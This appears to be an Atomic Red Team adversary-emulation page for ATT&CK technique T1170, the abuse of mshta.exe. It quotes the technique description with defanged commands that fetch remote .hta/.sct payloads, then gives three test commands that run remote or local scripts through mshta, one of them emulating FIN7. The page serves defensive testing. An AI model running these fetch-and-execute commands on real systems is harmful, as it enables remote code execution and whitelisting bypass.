# T1170 - Mshta
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1170)
<blockquote>Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension <code>.hta</code>. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)</blockquote>

<br/>

## Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
Test execution of a remote script using mshta.exe

**Supported Platforms:** Windows


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| file_url | location of the payload | Url | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct|

#### Run it with `command_prompt`! 
```
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
```



<br/>
<br/>

## Atomic Test #2 - Mshta calls a local VBScript file to launch notepad.exe
Tests execution of a local program by a VBScript file called by Mshta
**Supported Platforms:** Windows


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| local_file | Create a local VBScript file | path | C:\Temp\mshta_notepad.vbs|

#### Run it with `command_prompt`! 
```
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""{local_file_path}"")(window.close)")
```



<br/>
<br/>

## Atomic Test #3 - Mshta executes VBScript to execute malicious command
Run a local VB script to run local user enumeration powershell command

This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.

**Supported Platforms:** Windows


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| atomics_path | path to atomics folder | path | ..\..\atomics|

#### Run it with `command_prompt`! 
```
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file #{atomics_path}\T1170\src\powershell.ps1"":close")
```
